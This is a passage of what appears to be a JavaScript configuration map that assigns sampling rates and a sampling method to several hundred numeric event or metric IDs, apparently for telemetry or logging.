                        "218051286": {sampleRate: 1, samplingMethod: 1},
                        "218956945": {sampleRate: 1, samplingMethod: 1},
                        "218961347": {sampleRate: 1, samplingMethod: 1},
                        "218962025": {sampleRate: 1, samplingMethod: 1},
                        "218962528": {sampleRate: 1, samplingMethod: 1},
                        "218962602": {sampleRate: 1, samplingMethod: 1},
                        "218962996": {sampleRate: 1, samplingMethod: 1},
                        "218966113": {sampleRate: 1, samplingMethod: 1},
                        "218969087": {sampleRate: 1, samplingMethod: 1},
                        "218969883": {sampleRate: 1, samplingMethod: 1},
                        "218970026": {sampleRate: 1, samplingMethod: 1},
                        "218970632": {sampleRate: 1, samplingMethod: 1},
                        "218971974": {sampleRate: 1, samplingMethod: 1},
                        "221322158": {sampleRate: 10000, samplingMethod: 1},
                        "232522766": {sampleRate: 1, samplingMethod: 1},
                        "232530588": {sampleRate: 1, samplingMethod: 1},
                        "232531238": {sampleRate: 1, samplingMethod: 1},
                        "232533459": {sampleRate: 1, samplingMethod: 1},
                        "232536317": {sampleRate: 1, samplingMethod: 1},
                        "232726078": {sampleRate: 1, samplingMethod: 1},
                        "237963161": {sampleRate: 10000, samplingMethod: 1},
                        "238946702": {sampleRate: 1, samplingMethod: 1},
                        "241050641": {sampleRate: 1, samplingMethod: 1},
                        "241052667": {sampleRate: 1, samplingMethod: 1},
                        "241055991": {sampleRate: 1, samplingMethod: 1},
                        "241568984": {sampleRate: 1, samplingMethod: 1},
                        "241569419": {sampleRate: 1, samplingMethod: 1},
                        "241575915": {sampleRate: 1, samplingMethod: 1},
                        "243869892": {sampleRate: 10000, samplingMethod: 1},
                        "248069990": {sampleRate: 10000, samplingMethod: 1},
                        "256575931": {sampleRate: 10000, samplingMethod: 1},
                        "262995969": {sampleRate: 1, samplingMethod: 1},
                        "263004866": {sampleRate: 1, samplingMethod: 1},
                        "265815182": {sampleRate: 1, samplingMethod: 1},
                        "265816494": {sampleRate: 1, samplingMethod: 1},
                        "265820814": {sampleRate: 1, samplingMethod: 1},
                        "265824911": {sampleRate: 1, samplingMethod: 1},
                        "265830289": {sampleRate: 1, samplingMethod: 1},
                        "270205944": {sampleRate: 1, samplingMethod: 1},
                        "270206029": {sampleRate: 1, samplingMethod: 1},
                        "270206071": {sampleRate: 1, samplingMethod: 1},
                        "270206085": {sampleRate: 1, samplingMethod: 1},
                        "270206168": {sampleRate: 1, samplingMethod: 1},
                        "270206179": {sampleRate: 1, samplingMethod: 1},
                        "270206214": {sampleRate: 1, samplingMethod: 1},
                        "270206215": {sampleRate: 1, samplingMethod: 1},
                        "270206216": {sampleRate: 1, samplingMethod: 1},
                        "270206224": {sampleRate: 1, samplingMethod: 1},
                        "270206230": {sampleRate: 1, samplingMethod: 1},
                        "270206253": {sampleRate: 1, samplingMethod: 1},
                        "270206259": {sampleRate: 1, samplingMethod: 1},
                        "270206315": {sampleRate: 1, samplingMethod: 1},
                        "270206350": {sampleRate: 1, samplingMethod: 1},
                        "270206388": {sampleRate: 1, samplingMethod: 1},
                        "270206588": {sampleRate: 1, samplingMethod: 1},
                        "270206671": {sampleRate: 1, samplingMethod: 1},
                        "270206696": {sampleRate: 1, samplingMethod: 1},
                        "270206744": {sampleRate: 1, samplingMethod: 1},
                        "270206832": {sampleRate: 1, samplingMethod: 1},
                        "270206843": {sampleRate: 1, samplingMethod: 1},
                        "270206870": {sampleRate: 1, samplingMethod: 1},
                        "270207098": {sampleRate: 1, samplingMethod: 1},
                        "270207136": {sampleRate: 1, samplingMethod: 1},
                        "270207148": {sampleRate: 1, samplingMethod: 1},
                        "270207296": {sampleRate: 1, samplingMethod: 1},
                        "270207393": {sampleRate: 1, samplingMethod: 1},
                        "270207420": {sampleRate: 1, samplingMethod: 1},
                        "270207600": {sampleRate: 1, samplingMethod: 1},
                        "270207618": {sampleRate: 1, samplingMethod: 1},
                        "270207765": {sampleRate: 1, samplingMethod: 1},
                        "270207797": {sampleRate: 1, samplingMethod: 1},
                        "270207843": {sampleRate: 1, samplingMethod: 1},
                        "270207912": {sampleRate: 1, samplingMethod: 1},
                        "270207953": {sampleRate: 1, samplingMethod: 1},
                        "270208007": {sampleRate: 1, samplingMethod: 1},
                        "270208148": {sampleRate: 1, samplingMethod: 1},
                        "270208178": {sampleRate: 1, samplingMethod: 1},
                        "270208265": {sampleRate: 1, samplingMethod: 1},
                        "270208269": {sampleRate: 1, samplingMethod: 1},
                        "270208286": {sampleRate: 1, samplingMethod: 1},
                        "270208333": {sampleRate: 1, samplingMethod: 1},
                        "270208406": {sampleRate: 1, samplingMethod: 1},
                        "270208527": {sampleRate: 1, samplingMethod: 1},
                        "270208656": {sampleRate: 1, samplingMethod: 1},
                        "270208708": {sampleRate: 1, samplingMethod: 1},
                        "270208826": {sampleRate: 1, samplingMethod: 1},
                        "270208920": {sampleRate: 1, samplingMethod: 1},
                        "270208970": {sampleRate: 1, samplingMethod: 1},
                        "270209003": {sampleRate: 1, samplingMethod: 1},
                        "270209052": {sampleRate: 1, samplingMethod: 1},
                        "270209091": {sampleRate: 1, samplingMethod: 1},
                        "270209102": {sampleRate: 1, samplingMethod: 1},
                        "270209148": {sampleRate: 1, samplingMethod: 1},
                        "270209262": {sampleRate: 1, samplingMethod: 1},
                        "270209274": {sampleRate: 1, samplingMethod: 1},
                        "270209329": {sampleRate: 1, samplingMethod: 1},
                        "270209402": {sampleRate: 1, samplingMethod: 1},
                        "270209445": {sampleRate: 1, samplingMethod: 1},
                        "270209519": {sampleRate: 1, samplingMethod: 1},
                        "270209660": {sampleRate: 1, samplingMethod: 1},
                        "270209661": {sampleRate: 1, samplingMethod: 1},
                        "270209760": {sampleRate: 1, samplingMethod: 1},
                        "270209775": {sampleRate: 1, samplingMethod: 1},
                        "270209815": {sampleRate: 1, samplingMethod: 1},
                        "270209843": {sampleRate: 1, samplingMethod: 1},
                        "270209902": {sampleRate: 1, samplingMethod: 1},
                        "270209991": {sampleRate: 1, samplingMethod: 1},
                        "270210074": {sampleRate: 1, samplingMethod: 1},
                        "270210163": {sampleRate: 1, samplingMethod: 1},
                        "270210164": {sampleRate: 1, samplingMethod: 1},
                        "270210188": {sampleRate: 1, samplingMethod: 1},
                        "270210235": {sampleRate: 1, samplingMethod: 1},
                        "270210265": {sampleRate: 1, samplingMethod: 1},
                        "270210288": {sampleRate: 1, samplingMethod: 1},
                        "270210332": {sampleRate: 1, samplingMethod: 1},
                        "270210419": {sampleRate: 1, samplingMethod: 1},
                        "270210471": {sampleRate: 1, samplingMethod: 1},
                        "270210475": {sampleRate: 1, samplingMethod: 1},
                        "270210517": {sampleRate: 1, samplingMethod: 1},
                        "270210707": {sampleRate: 1, samplingMethod: 1},
                        "270210724": {sampleRate: 1, samplingMethod: 1},
                        "270210806": {sampleRate: 1, samplingMethod: 1},
                        "270210841": {sampleRate: 1, samplingMethod: 1},
                        "270210869": {sampleRate: 1, samplingMethod: 1},
                        "270210979": {sampleRate: 1, samplingMethod: 1},
                        "270211090": {sampleRate: 1, samplingMethod: 1},
                        "270211138": {sampleRate: 1, samplingMethod: 1},
                        "270211171": {sampleRate: 1, samplingMethod: 1},
                        "270211202": {sampleRate: 1, samplingMethod: 1},
                        "270211218": {sampleRate: 1, samplingMethod: 1},
                        "270211281": {sampleRate: 1, samplingMethod: 1},
                        "270211332": {sampleRate: 1, samplingMethod: 1},
                        "270211335": {sampleRate: 1, samplingMethod: 1},
                        "270211347": {sampleRate: 1, samplingMethod: 1},
                        "270211419": {sampleRate: 1, samplingMethod: 1},
                        "270211435": {sampleRate: 1, samplingMethod: 1},
                        "270211506": {sampleRate: 1, samplingMethod: 1},
                        "270211636": {sampleRate: 1, samplingMethod: 1},
                        "270211692": {sampleRate: 1, samplingMethod: 1},
                        "270211722": {sampleRate: 1, samplingMethod: 1},
                        "270211726": {sampleRate: 1, samplingMethod: 1},
                        "270211728": {sampleRate: 1, samplingMethod: 1},
                        "270211753": {sampleRate: 1, samplingMethod: 1},
                        "270211772": {sampleRate: 1, samplingMethod: 1},
                        "270211786": {sampleRate: 1, samplingMethod: 1},
                        "270211803": {sampleRate: 1, samplingMethod: 1},
                        "270211869": {sampleRate: 1, samplingMethod: 1},
                        "270211949": {sampleRate: 1, samplingMethod: 1},
                        "270212138": {sampleRate: 1, samplingMethod: 1},
                        "270212216": {sampleRate: 1, samplingMethod: 1},
                        "270212219": {sampleRate: 1, samplingMethod: 1},
                        "270212238": {sampleRate: 1, samplingMethod: 1},
                        "270212273": {sampleRate: 1, samplingMethod: 1},
                        "270212277": {sampleRate: 1, samplingMethod: 1},
                        "270212380": {sampleRate: 1, samplingMethod: 1},
                        "270212441": {sampleRate: 1, samplingMethod: 1},
                        "270212554": {sampleRate: 1, samplingMethod: 1},
                        "270212656": {sampleRate: 1, samplingMethod: 1},
                        "270212671": {sampleRate: 1, samplingMethod: 1},
                        "270212696": {sampleRate: 1, samplingMethod: 1},
                        "270212843": {sampleRate: 1, samplingMethod: 1},
                        "270212857": {sampleRate: 1, samplingMethod: 1},
                        "270212893": {sampleRate: 1, samplingMethod: 1},
                        "270212956": {sampleRate: 1, samplingMethod: 1},
                        "270213015": {sampleRate: 1, samplingMethod: 1},
                        "270213108": {sampleRate: 1, samplingMethod: 1},
                        "270213135": {sampleRate: 1, samplingMethod: 1},
                        "270213161": {sampleRate: 1, samplingMethod: 1},
                        "270213183": {sampleRate: 1, samplingMethod: 1},
                        "270213250": {sampleRate: 1, samplingMethod: 1},
                        "270213359": {sampleRate: 1, samplingMethod: 1},
                        "270213374": {sampleRate: 1, samplingMethod: 1},
                        "270213486": {sampleRate: 1, samplingMethod: 1},
                        "270213512": {sampleRate: 1, samplingMethod: 1},
                        "270213538": {sampleRate: 1, samplingMethod: 1},
                        "270213572": {sampleRate: 1, samplingMethod: 1},
                        "270213649": {sampleRate: 1, samplingMethod: 1},
                        "270213707": {sampleRate: 1, samplingMethod: 1},
                        "270213723": {sampleRate: 1, samplingMethod: 1},
                        "270213749": {sampleRate: 1, samplingMethod: 1},
                        "270213786": {sampleRate: 1, samplingMethod: 1},
                        "270214027": {sampleRate: 1, samplingMethod: 1},
                        "270214035": {sampleRate: 1, samplingMethod: 1},
                        "270214052": {sampleRate: 1, samplingMethod: 1},
                        "270214104": {sampleRate: 1, samplingMethod: 1},
                        "270214189": {sampleRate: 1, samplingMethod: 1},
                        "270214320": {sampleRate: 1, samplingMethod: 1},
                        "270214400": {sampleRate: 1, samplingMethod: 1},
                        "270214409": {sampleRate: 1, samplingMethod: 1},
                        "270214459": {sampleRate: 1, samplingMethod: 1},
                        "270214580": {sampleRate: 1, samplingMethod: 1},
                        "270214602": {sampleRate: 1, samplingMethod: 1},
                        "270214612": {sampleRate: 1, samplingMethod: 1},
                        "270214705": {sampleRate: 1, samplingMethod: 1},
                        "270214707": {sampleRate: 1, samplingMethod: 1},
                        "270214719": {sampleRate: 1, samplingMethod: 1},
                        "270214731": {sampleRate: 1, samplingMethod: 1},
                        "270214784": {sampleRate: 1, samplingMethod: 1},
                        "270214832": {sampleRate: 1, samplingMethod: 1},
                        "270214973": {sampleRate: 1, samplingMethod: 1},
                        "270214989": {sampleRate: 1, samplingMethod: 1},
                        "270215065": {sampleRate: 1, samplingMethod: 1},
                        "270215070": {sampleRate: 1, samplingMethod: 1},
                        "270215101": {sampleRate: 1, samplingMethod: 1},
                        "270215116": {sampleRate: 1, samplingMethod: 1},
                        "270215140": {sampleRate: 1, samplingMethod: 1},
                        "270215224": {sampleRate: 1, samplingMethod: 1},
                        "270215230": {sampleRate: 1, samplingMethod: 1},
                        "270215347": {sampleRate: 1, samplingMethod: 1},
                        "270215397": {sampleRate: 1, samplingMethod: 1},
                        "270215429": {sampleRate: 1, samplingMethod: 1},
                        "270215542": {sampleRate: 1, samplingMethod: 1},
                        "270215574": {sampleRate: 1, samplingMethod: 1},
                        "270215690": {sampleRate: 1, samplingMethod: 1},
                        "270215709": {sampleRate: 1, samplingMethod: 1},
                        "270215742": {sampleRate: 1, samplingMethod: 1},
                        "270215772": {sampleRate: 1, samplingMethod: 1},
                        "270215778": {sampleRate: 1, samplingMethod: 1},
                        "270215792": {sampleRate: 1, samplingMethod: 1},
                        "270215819": {sampleRate: 1, samplingMethod: 1},
                        "270215979": {sampleRate: 1, samplingMethod: 1},
                        "270216000": {sampleRate: 1, samplingMethod: 1},
                        "270216093": {sampleRate: 1, samplingMethod: 1},
                        "270216139": {sampleRate: 1, samplingMethod: 1},
                        "270216182": {sampleRate: 1, samplingMethod: 1},
                        "270216195": {sampleRate: 1, samplingMethod: 1},
                        "270216200": {sampleRate: 1, samplingMethod: 1},
                        "270216416": {sampleRate: 1, samplingMethod: 1},
                        "270216423": {sampleRate: 1, samplingMethod: 1},
                        "270216430": {sampleRate: 1, samplingMethod: 1},
                        "270216450": {sampleRate: 1, samplingMethod: 1},
                        "270216713": {sampleRate: 1, samplingMethod: 1},
                        "270216791": {sampleRate: 1, samplingMethod: 1},
                        "270216793": {sampleRate: 1, samplingMethod: 1},
                        "270216818": {sampleRate: 1, samplingMethod: 1},
                        "270216896": {sampleRate: 1, samplingMethod: 1},
                        "270216928": {sampleRate: 1, samplingMethod: 1},
                        "270216941": {sampleRate: 1, samplingMethod: 1},
                        "270217026": {sampleRate: 1, samplingMethod: 1},
                        "270217057": {sampleRate: 1, samplingMethod: 1},
                        "270217063": {sampleRate: 1, samplingMethod: 1},
                        "270217068": {sampleRate: 1, samplingMethod: 1},
                        "270217210": {sampleRate: 1, samplingMethod: 1},
                        "270217236": {sampleRate: 1, samplingMethod: 1},
                        "270217256": {sampleRate: 1, samplingMethod: 1},
                        "270217283": {sampleRate: 1, samplingMethod: 1},
                        "270217313": {sampleRate: 1, samplingMethod: 1},
                        "270217327": {sampleRate: 1, samplingMethod: 1},
                        "270217401": {sampleRate: 1, samplingMethod: 1},
                        "270217492": {sampleRate: 1, samplingMethod: 1},
                        "270217539": {sampleRate: 1, samplingMethod: 1},
                        "270217616": {sampleRate: 1, samplingMethod: 1},
                        "270217631": {sampleRate: 1, samplingMethod: 1},
                        "270217722": {sampleRate: 1, samplingMethod: 1},
                        "270217749": {sampleRate: 1, samplingMethod: 1},
                        "270217779": {sampleRate: 1, samplingMethod: 1},
                        "270217787": {sampleRate: 1, samplingMethod: 1},
                        "270217798": {sampleRate: 1, samplingMethod: 1},
                        "270217820": {sampleRate: 1, samplingMethod: 1},
                        "270217862": {sampleRate: 1, samplingMethod: 1},
                        "270217878": {sampleRate: 1, samplingMethod: 1},
                        "270217900": {sampleRate: 1, samplingMethod: 1},
                        "270217954": {sampleRate: 1, samplingMethod: 1},
                        "270218007": {sampleRate: 1, samplingMethod: 1},
                        "270218053": {sampleRate: 1, samplingMethod: 1},
                        "270218090": {sampleRate: 1, samplingMethod: 1},
                        "270218102": {sampleRate: 1, samplingMethod: 1},
                        "270218152": {sampleRate: 1, samplingMethod: 1},
                        "270218163": {sampleRate: 1, samplingMethod: 1},
                        "270218166": {sampleRate: 1, samplingMethod: 1},
                        "270218168": {sampleRate: 1, samplingMethod: 1},
                        "270218204": {sampleRate: 1, samplingMethod: 1},
                        "270218207": {sampleRate: 1, samplingMethod: 1},
                        "270218271": {sampleRate: 1, samplingMethod: 1},
                        "270218310": {sampleRate: 1, samplingMethod: 1},
                        "270218326": {sampleRate: 1, samplingMethod: 1},
                        "270218338": {sampleRate: 1, samplingMethod: 1},
                        "270218436": {sampleRate: 1, samplingMethod: 1},
                        "270218543": {sampleRate: 1, samplingMethod: 1},
                        "270218572": {sampleRate: 1, samplingMethod: 1},
                        "270218586": {sampleRate: 1, samplingMethod: 1},
                        "270218605": {sampleRate: 1, samplingMethod: 1},
                        "270218622": {sampleRate: 1, samplingMethod: 1},
                        "270218660": {sampleRate: 1, samplingMethod: 1},
                        "270218696": {sampleRate: 1, samplingMethod: 1},
                        "270218731": {sampleRate: 1, samplingMethod: 1},
                        "270218991": {sampleRate: 1, samplingMethod: 1},
                        "270219017": {sampleRate: 1, samplingMethod: 1},
                        "270219019": {sampleRate: 1, samplingMethod: 1},
                        "270219051": {sampleRate: 1, samplingMethod: 1},
                        "270219139": {sampleRate: 1, samplingMethod: 1},
                        "270219169": {sampleRate: 1, samplingMethod: 1},
                        "270219188": {sampleRate: 1, samplingMethod: 1},
                        "270219248": {sampleRate: 1, samplingMethod: 1},
                        "270219249": {sampleRate: 1, samplingMethod: 1},
                        "270219291": {sampleRate: 1, samplingMethod: 1},
                        "270219303": {sampleRate: 1, samplingMethod: 1},
                        "270219320": {sampleRate: 1, samplingMethod: 1},
                        "270219404": {sampleRate: 1, samplingMethod: 1},
                        "270219449": {sampleRate: 1, samplingMethod: 1},
                        "270219483": {sampleRate: 1, samplingMethod: 1},
                        "270219531": {sampleRate: 1, samplingMethod: 1},
                        "270219562": {sampleRate: 1, samplingMethod: 1},
                        "270219686": {sampleRate: 1, samplingMethod: 1},
                        "270219870": {sampleRate: 1, samplingMethod: 1},
                        "270219914": {sampleRate: 1, samplingMethod: 1},
                        "270219926": {sampleRate: 1, samplingMethod: 1},
                        "270220001": {sampleRate: 1, samplingMethod: 1},
                        "270220072": {sampleRate: 1, samplingMethod: 1},
                        "270220074": {sampleRate: 1, samplingMethod: 1},
                        "270220108": {sampleRate: 1, samplingMethod: 1},
                        "270220129": {sampleRate: 1, samplingMethod: 1},
                        "270220209": {sampleRate: 1, samplingMethod: 1},
                        "270220261": {sampleRate: 1, samplingMethod: 1},
                        "270220262": {sampleRate: 1, samplingMethod: 1},
                        "270220333": {sampleRate: 1, samplingMethod: 1},
                        "270220347": {sampleRate: 1, samplingMethod: 1},
                        "270220481": {sampleRate: 1, samplingMethod: 1},
                        "270220499": {sampleRate: 1, samplingMethod: 1},
                        "270220550": {sampleRate: 1, samplingMethod: 1},
                        "270220595": {sampleRate: 1, samplingMethod: 1},
                        "270220640": {sampleRate: 1, samplingMethod: 1},
                        "270220731": {sampleRate: 1, samplingMethod: 1},
                        "270220850": {sampleRate: 1, samplingMethod: 1},
                        "270220865": {sampleRate: 1, samplingMethod: 1},
                        "270220879": {sampleRate: 1, samplingMethod: 1},
                        "270220889": {sampleRate: 1, samplingMethod: 1},
                        "270220997": {sampleRate: 1, samplingMethod: 1},
                        "270221024": {sampleRate: 1, samplingMethod: 1},
                        "270221065": {sampleRate: 1, samplingMethod: 1},
                        "270221124": {sampleRate: 1, samplingMethod: 1},
                        "270221133": {sampleRate: 1, samplingMethod: 1},
                        "270221175": {sampleRate: 1, samplingMethod: 1},
                        "270221177": {sampleRate: 1, samplingMethod: 1},
                        "270224526": {sampleRate: 1, samplingMethod: 1},
                        "270228232": {sampleRate: 1, samplingMethod: 1},
                        "270230590": {sampleRate: 1, samplingMethod: 1},
                        "270230822": {sampleRate: 1, samplingMethod: 1},
                        "270232559": {sampleRate: 1, samplingMethod: 1},
                        "270233440": {sampleRate: 1, samplingMethod: 1},
                        "273481729": {sampleRate: 1, samplingMethod: 1},
                        "295437333": {sampleRate: 1, samplingMethod: 1},
                        "295437392": {sampleRate: 1, samplingMethod: 1},
                        "295437585": {sampleRate: 1, samplingMethod: 1},
                        "295437809": {sampleRate: 1, samplingMethod: 1},
                        "295437849": {sampleRate: 1, samplingMethod: 1},
                        "295438195": {sampleRate: 1, samplingMethod: 1},
                        "295438980": {sampleRate: 1, samplingMethod: 1},
                        "295439218": {sampleRate: 1, samplingMethod: 1},
                        "295439505": {sampleRate: 1, samplingMethod: 1},
                        "295439522": {sampleRate: 1, samplingMethod: 1},
                        "295439982": {sampleRate: 1, samplingMethod: 1},
                        "295440238": {sampleRate: 1, samplingMethod: 1},
                        "295440518": {sampleRate: 1, samplingMethod: 1},
                        "295440638": {sampleRate: 1, samplingMethod: 1},
                        "295441099": {sampleRate: 1, samplingMethod: 1},
                        "295441104": {sampleRate: 1, samplingMethod: 1},
                        "295441165": {sampleRate: 1, samplingMethod: 1},
                        "295441218": {sampleRate: 1, samplingMethod: 1},
                        "295441453": {sampleRate: 1, samplingMethod: 1},
                        "295442359": {sampleRate: 1, samplingMethod: 1},
                        "295442443": {sampleRate: 1, samplingMethod: 1},
                        "295442568": {sampleRate: 1, samplingMethod: 1},
                        "295442707": {sampleRate: 1, samplingMethod: 1},
                        "295443394": {sampleRate: 1, samplingMethod: 1},
                        "295443659": {sampleRate: 1, samplingMethod: 1},
                        "295444052": {sampleRate: 1, samplingMethod: 1},
                        "295444127": {sampleRate: 1, samplingMethod: 1},
                        "295444428": {sampleRate: 1, samplingMethod: 1},
                        "295444872": {sampleRate: 1, samplingMethod: 1},
                        "295444992": {sampleRate: 1, samplingMethod: 1},
                        "295445259": {sampleRate: 1, samplingMethod: 1},
                        "295445408": {sampleRate: 1, samplingMethod: 1},
                        "295445507": {sampleRate: 1, samplingMethod: 1},
                        "295446230": {sampleRate: 1, samplingMethod: 1},
                        "295447305": {sampleRate: 1, samplingMethod: 1},
                        "295447411": {sampleRate: 1, samplingMethod: 1},
                        "295447532": {sampleRate: 1, samplingMethod: 1},
                        "295447763": {sampleRate: 1, samplingMethod: 1},
                        "295448628": {sampleRate: 1, samplingMethod: 1},
                        "295448870": {sampleRate: 1, samplingMethod: 1},
                        "295448939": {sampleRate: 1, samplingMethod: 1},
                        "295449023": {sampleRate: 1, samplingMethod: 1},
                        "295449229": {sampleRate: 1, samplingMethod: 1},
                        "295449938": {sampleRate: 1, samplingMethod: 1},
                        "295450853": {sampleRate: 1, samplingMethod: 1},
                        "295450962": {sampleRate: 1, samplingMethod: 1},
                        "295451974": {sampleRate: 1, samplingMethod: 1},
                        "295451977": {sampleRate: 1, samplingMethod: 1},
                        "295452084": {sampleRate: 1, samplingMethod: 1},
                        "295452498": {sampleRate: 1, samplingMethod: 1},
                        "295576223": {sampleRate: 1, samplingMethod: 1},
                        "300429672": {sampleRate: 100, samplingMethod: 1},
                        "303370010": {sampleRate: 10000, samplingMethod: 1},
                        "303374119": {sampleRate: 10000, samplingMethod: 1},
                        "303375609": {sampleRate: 10000, samplingMethod: 1},
                        "314255059": {sampleRate: 1, samplingMethod: 1},
                        "314255718": {sampleRate: 1, samplingMethod: 1},
                        "314255820": {sampleRate: 1, samplingMethod: 1},
                        "314256622": {sampleRate: 1, samplingMethod: 1},
                        "315555841": {sampleRate: 10000, samplingMethod: 1},
                        "316804045": {sampleRate: 1, samplingMethod: 1},
                        "316804194": {sampleRate: 1, samplingMethod: 1},
                        "316805991": {sampleRate: 1, samplingMethod: 1},
                        "316806070": {sampleRate: 1, samplingMethod: 1},
                        "316806359": {sampleRate: 1, samplingMethod: 1},
                        "316806850": {sampleRate: 1, samplingMethod: 1},
                        "316812351": {sampleRate: 1, samplingMethod: 1},
                        "316812736": {sampleRate: 1, samplingMethod: 1},
                        "316814957": {sampleRate: 1, samplingMethod: 1},
                        "316816299": {sampleRate: 1, samplingMethod: 1},
                        "318701569": {sampleRate: 1, samplingMethod: 1},
                        "318707653": {sampleRate: 1, samplingMethod: 1},
                        "318710863": {sampleRate: 1, samplingMethod: 1},
                        "318716922": {sampleRate: 1, samplingMethod: 1},
                        "320809182": {sampleRate: 1, samplingMethod: 1},
                        "336201917": {sampleRate: 1, samplingMethod: 1},
                        "336205322": {sampleRate: 1, samplingMethod: 1},
                        "336207527": {sampleRate: 1, samplingMethod: 1},
                        "336212887": {sampleRate: 1, samplingMethod: 1},
                        "336213902": {sampleRate: 1, samplingMethod: 1},
                        "336215495": {sampleRate: 1, samplingMethod: 1},
                        "339818860": {sampleRate: 1, samplingMethod: 1},
                        "341835776": {sampleRate: 1, samplingMethod: 1},
                        "341835777": {sampleRate: 1, samplingMethod: 1},
                        "341848280": {sampleRate: 1, samplingMethod: 1},
                        "348132017": {sampleRate: 1, samplingMethod: 1},
                        "351152344": {sampleRate: 10000, samplingMethod: 1},
                        "351539711": {sampleRate: 1, samplingMethod: 1},
                        "351540102": {sampleRate: 1, samplingMethod: 1},
                        "351540413": {sampleRate: 1, samplingMethod: 1},
                        "351540800": {sampleRate: 1, samplingMethod: 1},
                        "351541595": {sampleRate: 1, samplingMethod: 1},
                        "351542287": {sampleRate: 1, samplingMethod: 1},
                        "351543947": {sampleRate: 1, samplingMethod: 1},
                        "351544664": {sampleRate: 1, samplingMethod: 1},
                        "351545881": {sampleRate: 1, samplingMethod: 1},
                        "351546487": {sampleRate: 1, samplingMethod: 1},
                        "351546651": {sampleRate: 1, samplingMethod: 1},
                        "351548391": {sampleRate: 1, samplingMethod: 1},
                        "351548854": {sampleRate: 1, samplingMethod: 1},
                        "368647392": {sampleRate: 1, samplingMethod: 1},
                        "373295708": {sampleRate: 1000, samplingMethod: 1},
                        "373298325": {sampleRate: 1000, samplingMethod: 1},
                        "373308219": {sampleRate: 1000, samplingMethod: 1},
                        "374672177": {sampleRate: 1, samplingMethod: 1},
                        "374678380": {sampleRate: 1, samplingMethod: 1},
                        "377357808": {sampleRate: 1, samplingMethod: 1},
                        "377358784": {sampleRate: 1, samplingMethod: 1},
                        "377359040": {sampleRate: 1, samplingMethod: 1},
                        "377359367": {sampleRate: 1, samplingMethod: 1},
                        "377359743": {sampleRate: 1, samplingMethod: 1},
                        "377360139": {sampleRate: 1, samplingMethod: 1},
                        "377360510": {sampleRate: 1, samplingMethod: 1},
                        "377361415": {sampleRate: 1, samplingMethod: 1},
                        "377362087": {sampleRate: 5, samplingMethod: 1},
                        "377362266": {sampleRate: 1, samplingMethod: 1},
                        "377363484": {sampleRate: 1, samplingMethod: 1},
                        "377364678": {sampleRate: 1, samplingMethod: 1},
                        "377364955": {sampleRate: 1, samplingMethod: 1},
                        "377364984": {sampleRate: 1, samplingMethod: 1},
                        "377367558": {sampleRate: 1, samplingMethod: 1},
                        "377367763": {sampleRate: 5, samplingMethod: 1},
                        "377369626": {sampleRate: 1, samplingMethod: 1},
                        "377370025": {sampleRate: 1, samplingMethod: 1},
                        "377370051": {sampleRate: 1, samplingMethod: 1},
                        "377370203": {sampleRate: 1, samplingMethod: 1},
                        "377370433": {sampleRate: 1, samplingMethod: 1},
                        "377371065": {sampleRate: 1, samplingMethod: 1},
                        "377371646": {sampleRate: 1, samplingMethod: 1},
                        "377817277": {sampleRate: 1, samplingMethod: 1},
                        "377828343": {sampleRate: 1, samplingMethod: 1},
                        "380895233": {sampleRate: 1, samplingMethod: 1},
                        "382140417": {sampleRate: 100, samplingMethod: 1},
                        "382140418": {sampleRate: 100, samplingMethod: 1},
                        "382144536": {sampleRate: 10000, samplingMethod: 1},
                        "382151174": {sampleRate: 10000, samplingMethod: 1},
                        "382468096": {sampleRate: 1, samplingMethod: 1},
                        "382468097": {sampleRate: 1, samplingMethod: 1},
                        "382468098": {sampleRate: 1, samplingMethod: 1},
                        "382468099": {sampleRate: 1, samplingMethod: 1},
                        "382482261": {sampleRate: 1, samplingMethod: 1},
                        "390269683": {sampleRate: 1, samplingMethod: 1},
                        "390272426": {sampleRate: 1, samplingMethod: 1},
                        "390275150": {sampleRate: 1, samplingMethod: 1},
                        "390276342": {sampleRate: 10000, samplingMethod: 1},
                        "390279467": {sampleRate: 10000, samplingMethod: 1},
                        "390280883": {sampleRate: 10000, samplingMethod: 1},
                        "390281220": {sampleRate: 10000, samplingMethod: 1},
                        "390281974": {sampleRate: 10000, samplingMethod: 1},
                        "392106711": {sampleRate: 1, samplingMethod: 1},
                        "392107390": {sampleRate: 1, samplingMethod: 1},
                        "392115811": {sampleRate: 1, samplingMethod: 1},
                        "392966766": {sampleRate: 10000, samplingMethod: 1},
                        "394788865": {sampleRate: 10000, samplingMethod: 1},
                        "398592899": {sampleRate: 1, samplingMethod: 1},
                        "398601326": {sampleRate: 1, samplingMethod: 1},
                        "398605840": {sampleRate: 1, samplingMethod: 1},
                        "399182973": {sampleRate: 1, samplingMethod: 1},
                        "399185036": {sampleRate: 1, samplingMethod: 1},
                        "399185894": {sampleRate: 1, samplingMethod: 1},
                        "399185985": {sampleRate: 1, samplingMethod: 1},
                        "399186794": {sampleRate: 1, samplingMethod: 1},
                        "399187008": {sampleRate: 1, samplingMethod: 1},
                        "399188160": {sampleRate: 1, samplingMethod: 1},
                        "399190027": {sampleRate: 1, samplingMethod: 1},
                        "399191513": {sampleRate: 1, samplingMethod: 1},
                        "399191697": {sampleRate: 1, samplingMethod: 1},
                        "399191926": {sampleRate: 1, samplingMethod: 1},
                        "399192359": {sampleRate: 1, samplingMethod: 1},
                        "399193700": {sampleRate: 1, samplingMethod: 1},
                        "399194693": {sampleRate: 1, samplingMethod: 1},
                        "399194700": {sampleRate: 1, samplingMethod: 1},
                        "399194972": {sampleRate: 1, samplingMethod: 1},
                        "399195628": {sampleRate: 1, samplingMethod: 1},
                        "403271918": {sampleRate: 1, samplingMethod: 1},
                        "404622304": {sampleRate: 1, samplingMethod: 1},
                        "404626521": {sampleRate: 1, samplingMethod: 1},
                        "404626709": {sampleRate: 1, samplingMethod: 1},
                        "404630839": {sampleRate: 1, samplingMethod: 1},
                        "404631825": {sampleRate: 1, samplingMethod: 1},
                        "404632630": {sampleRate: 1, samplingMethod: 1},
                        "406978561": {sampleRate: 10000, samplingMethod: 1},
                        "406980340": {sampleRate: 10000, samplingMethod: 1},
                        "406983321": {sampleRate: 10000, samplingMethod: 1},
                        "409677744": {sampleRate: 1, samplingMethod: 1},
                        "416876920": {sampleRate: 1, samplingMethod: 1},
                        "416877160": {sampleRate: 1, samplingMethod: 1},
                        "416880118": {sampleRate: 1, samplingMethod: 1},
                        "416880668": {sampleRate: 1, samplingMethod: 1},
                        "416883138": {sampleRate: 1, samplingMethod: 1},
                        "416884823": {sampleRate: 1, samplingMethod: 1},
                        "416888659": {sampleRate: 1, samplingMethod: 1},
                        "416890732": {sampleRate: 1, samplingMethod: 1},
